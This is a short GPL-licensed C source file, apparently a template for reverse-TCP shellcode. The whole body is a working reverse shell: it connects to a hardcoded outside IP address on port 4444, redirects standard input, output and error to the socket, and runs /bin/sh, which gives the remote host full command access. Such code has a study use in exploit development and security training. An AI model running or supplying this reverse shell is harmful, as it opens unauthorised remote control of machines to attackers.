//    shellcode_reverse_tcp.c - Generate the shellcode with the correct port in
//    Copyright (C) 2013 dummys  - http://www.twitter.com/dummys1337
//
//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <http://www.gnu.org/licenses/>.
//

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
   
   char *execveargs[] = { "/bin//sh", NULL, NULL };
   int sockfd, new_sockfd;
   struct sockaddr_in host_addr, client_addr;
   socklen_t sin_size;

   sockfd = socket(AF_INET, SOCK_STREAM, 0);

   host_addr.sin_family = AF_INET;
   host_addr.sin_port = htons(4444);
   host_addr.sin_addr.s_addr = inet_addr("80.245.22.153");

   memset(&(host_addr.sin_zero), '\0', 8);

   connect(sockfd, (struct sockaddr *)&host_addr, sizeof(host_addr));
   dup2(sockfd,0);
   dup2(sockfd,1);
   dup2(sockfd,2);

   execve("/bin//sh", execveargs, 0);
}   
